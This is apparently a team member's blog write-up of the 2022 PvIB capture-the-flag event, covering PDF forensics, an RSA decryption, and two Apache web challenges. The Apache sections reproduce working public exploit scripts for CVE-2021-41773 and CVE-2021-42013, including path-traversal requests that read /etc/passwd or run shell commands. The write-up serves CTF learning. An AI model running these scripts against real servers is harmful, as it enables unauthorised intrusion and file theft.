---
title: PvIB CTF 2022
date:
  created: 2022-03-08
description: Team Picobello BV at the 2022 PvIB CTF
---

<!-- more -->

## What is PvIB CTF?

PvIB or Platform voor InformatieBeveiliging is a knowledge center that aims to gather and spread knowledge regarding information security. It achieves this goal via organising events at which this knowledge is shared, cooperation with parties in the industry, publishing news about the industry among others. To learn more about PvIB itself their website is as follows: [pvib.nl][pvib.nl].

The event via which I learned about PvIB is their pentest event back in 2019 where students and professionals alike can get together and compete in a CTF. Our team entered once before in 2019 when we were just getting started and knew basically nothing. This time around we came more prepared and knowledgeable in hopes of being able to compete for a better position, which we did! In contrast to 2019s semi-last place finish we managed to finish 7th out of 29 in a tie for 6th!

<figure markdown="span">
	![PvIB CTF scoreboard showing the position of team Picobello BV at 7th place](./images/PvIB/PvIB-CTF-2022-Picobello-7th-place.webp)
</figure>

## Solved Challenges

In total we managed to solve about 6 challenges I think with all three of us being (pretty) close to solving another one. The challenges that I worked on or did are covered within this writeup.

### SoEasy - Easy

One of the first challenges I started to work on was a challenge in which a PDF was given with the name "SoEasy.pdf".

Opening the PDF showed a generic lorem ipsum text with a blacked out section in the middle of the text. Highlighting this section revealed the following text: `1:9af864` which was odd and stood out from the lorem ipsum text.

Next there was a section at the bottom in an odd font that reminded me of dingdings -A quote unquote font consisting of what could b described as emojis instead of letters. Instead of dingdings, this turned out to be webdings and I started trying to translate it. The webdings text can be seen down below:

<figure markdown="span">
	![PvIB CTF SoEasy challenge pt. 5: webdings font](./images/PvIB/PvIB-CTF-2022-SoEasy-pt5.webp)
</figure>

Translating the webdings to their regular form gave the text `5:bd4d0d54`.

With now having a 1: and a 5: it started to look like there were five or more hidden pieces of text that had to be recovered, so I started to look deeper into the PDF.

Running the tool `pdfparser` within Kali revealed the 4th bit of infromation within the Author field that looked like so:

```text title="pdfparser output"
obj 14 0
 Type:
 Referencing:

  <<
    /Author (4: 1f7226)
    /Creator '(þÿ\x00M\x00i\x00c\x00r\x00o\x00s\x00o\x00f\x00t\x00®\x00 \x00W\x00o\x00r\x00d\x00 \x00f\x00o\x00r\x00 \x00M\x00i\x00c\x00r\x00o\x00s\x00o\x00f\x00t\x00 \x003\x006\x005)'
    /CreationDate "(D:20211028173419+02'00')"
    /ModDate "(D:20211028173419+02'00')"
    /Producer '(þÿ\x00M\x00i\x00c\x00r\x00o\x00s\x00o\x00f\x00t\x00®\x00 \x00W\x00o\x00r\x00d\x00 \x00f\x00o\x00r\x00 \x00M\x00i\x00c\x00r\x00o\x00s\x00o\x00f\x00t\x00 \x003\x006\x005)'
  >>
```

Great! After this my teammate Jurrien said to have a look at invisible characters that were written in white font. This revealed the second bit of the string and looked the following when highlighted.

<figure markdown="span">
	![PvIB CTF SoEasy challenge pt. 2: white text on a PDF](./images/PvIB/PvIB-CTF-2022-SoEasy-pt2.webp)
</figure>

The last part of the flag was hidden in a series of small, hidden white characters near the end of the PDF, of which I first thought they were a regular PDF artefact. This turned *not* to be the case and would reveal the third and last section of the flag when selected and copied into a text file to show the following: `3: 7f4d16`.

With the five portions found we end up with a string that is of equal length as an MD5 hash, which is a valid flag format when entered with the prefix `pvib{` and suffix `}` to form the following flag: `pvib{9af8643630077f4d161f7226bd4d0d54}`.

And with that our first easy 100 point challenge is completed!

### Plzhackme - Easy

The next challenge was named Plzhackme and linked to a website showing plain HTML text about the server and what was present. The website would look the following from within a browser:

<figure markdown="span">
	![PvIB CTF PlzHackme challenge showing challenge homepage](./images/PvIB/PvIB-CTF-2022-Plzhackme-homepage.webp)
</figure>

This shows that the flag we need to grab is present within the machine under the path `/opt/tools/flag.txt` and will be our main priority. As to getting the flag, the website contents explicitly hints at the creator hoping the webserver is secure. Looking at the response given by the webserver shows the webserver being Apache 2.4.49:

<figure markdown="span">
	![PvIB CTF PlzHackme challenge showing server version](./images/PvIB/PvIB-CTF-2022-Plzhackme-Apache-server-response.webp)
</figure>

Looking online for this version of Apache reveals a CVE for path traversal a remote code execution (RCE) with a matching exploit. This exploit is available via exploit db under following URL: [exploit-db.com/exploits/50383][edb-50383] and is written in a shell script:

```bash title="Apache 2.4.49 exploit code" linenums="1"
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
```

In order to execute the script and exploit the vulnerability we need a file with targets via a `targets.txt` text file. To satisfy this demand we'll place the URL to the challenge within a text file with this name like so: `http://ctf.pvib.lan:30000/`. Then executing the command and pointing it at the directory with our flag shows the flag we needed to grab:

```sh title="Exploit code execution and flag output"
$ ./Downloads/Apache-vuln.sh targets.txt /opt/tools/flag.txt
http://ctf.pvib.lan:30000/
PvIB{A425740aedb0862cd04c68ffab55b7c7}
```

And with that our second challenge is completed!

### Plzhackme2 - Medium

A follow-up to Plzhackme is also present in the form of Plzhackme2. This challenge showed an updated website acknowledging the shortcomings of the former version:

<figure markdown="span">
	![PvIB CTF PlzHackme2 web server homepage](./images/PvIB/PvIB-CTF-2022-Plzhackme2-homepage.webp)
</figure>

The challenge refers to the vulnerability present within Plzhackme and shows the creator hoping this newer version of Apache does not contain this vulnerability anymore. To confirm this, let's check the Apache version and see if anything has changed:

<figure markdown="span">
	![PvIB CTF PlzHackme2 web server version](./images/PvIB/PvIB-CTF-2022-Plzhackme2-Apache-server-response.webp)
</figure>

The server version has incremented by one from 2.4.49 to 2.4.50! A brief look at the prior exploit shows that an adapted version exists for 2.4.50 that can be found at exploit db under: [exploit-db.com/exploits/50406][edb-50406] and contains the same shell script more or less:

```bash title="Apache 2.4.50 bash exploit code" linenums="1"
# Exploit: Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.50
# Tested on: 2.4.50
# CVE : CVE-2021-42013
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
echo ./PoC.sh targets.txt /bin/sh id

exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
```

With a slight update to the former `targets.txt` file we get the flag in a similar fashion as with Plzhackme:

```sh title="Exploit code execution + flag output"
$ ./Downloads/Apache-vuln-2.sh targets.txt /opt/tools/flag.txt
http://ctf.pvib.lan:30009/
PvIB{A42c1851bf40cf6e8560b4d4aecc5803}
```

And that concludes Plzhackme2.

### Really Secure Auhentication - Medium

The last challenge that I worked on and completed with Jurrien was a challenge named along the lines of Really Secure Authentication. This challenge was about secure communications that had been intercepted in an attached text file. When opening the text file the following three lines of text were visible:

```text
n: 751944827518931855370145792242227334404449456977330825932565508347519452471720996019342455750986347634310655002476005329833137719811783712050661254646066556133618200333755491605963055790320809375984599674000845562270555208046429768516382136333412763446723244014970442827535754767052316133883954792641867864888208739825821493659737342617982388332010830338498753968724916306935267467054334934605872290488043840670357237895873054050153940932751988284650596088901530385201228893686622590846768040761727550403663428479629370674396665785658496101867364304868198241115917987665036900941980357355129636944254529410567149005485564245092766702046418692324006374079684890146332307775520012057458993847693145612813649782570349788225261340300824790198052963549269923841425871709018080007311161655660573648487492821665708046336799910169583155130422833664670993511130488624779150443096891560722611053742917159877787014964068760510818119035549096629413212227000148638707941597937001049564830319525271381504966580996470264249327694253184473894896836655656223272222895825457745073880035972302692523239636329914379406476638222189891000731339250312591696934947534557491842267485795947211406374638831643506273133801068866927392915776936620398148678410137
e: 3
c: 1075002603646551729302510776462521930136580859525123762657827756151916735445395650094946703030628073055208366008689878533036481358177423329060596528435812651593442639941645000852916387878133450602989010460154321853925869778346429055368074708241687984173432476889229325401957
```

The format of data looked familiar to Jurrien and I and he then found a Stack Overflow thread about decrypting RSA cipher text when you have n, e, and c. The thread links to a Python script to crack RSA CTF challenges, but this ended up taking too long to be practical from the short few minutes we tried it. An old favourite of mine, [dcode.fr](https://dcode.fr) was also linked within the thread and ended up giving us the flag we were after.

[dcode.fr](https://dcode.fr) is a really cool website for encrypting and decrypting cipher texts that can be found in CTFs or other challenge formats. It contains algorithms for a broad range of ciphers and even have RSA it seems!

Entering the required information to decrypt the RSA cipher text is straight forward; match the letters of the input and press decrypt. Entering the required information in the right slots gave the flag for this challenge:

<figure markdown="span">
	![PvIB CTF Really Secure Authentication](./images/PvIB/PvIB-CTF-2022-Really-Secure-Authentication.webp)
</figure>

Et voila! We have the flag for this challenge.

## Closing thoughts

We took place in the PvIB CTF once before back in 2019. At the time we had *very* little experience regarding CTFs and infosec in general, and managed to complete a single challenge as an entire table. In the meantime all three of us have gained a lot of knowledge, started working more in the infosec field, and have all gotten our OSCP. All this amounted to being able to complete ~6 challenges within the 3.5 hour time limit as a team! Personally, I'm very pleased with the progress we have booked and are looking forward to doing more CTFs in the future.

As for the CTF itself; we knew what we were getting ourselves into this time around. We knew the limited time was going to be up the stress and we would have to pick our battles carefully and not drown in a single challenge for 3.5 hours. The challenges had a pretty broad range from some forensics, reversing, and web stuff of which we skipped most due to time and personal limitations. We hope to be able to solve these in the future as we get more experience and knowledge within these fields.

I'd like to thank PvIB for running another round of the CTF now that the COVID-19 situation has calmed a bit and in-person events are once again possible and am looking forward to the next iteration!  

[jekyll-docs]: http://jekyllrb.com/docs/home
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-talk]: https://talk.jekyllrb.com/
[pvib.nl]:     https://www.pvib.nl/
[edb-50383]:    https://www.exploit-db.com/exploits/50383
[edb-50406]:    https://www.exploit-db.com/exploits/50406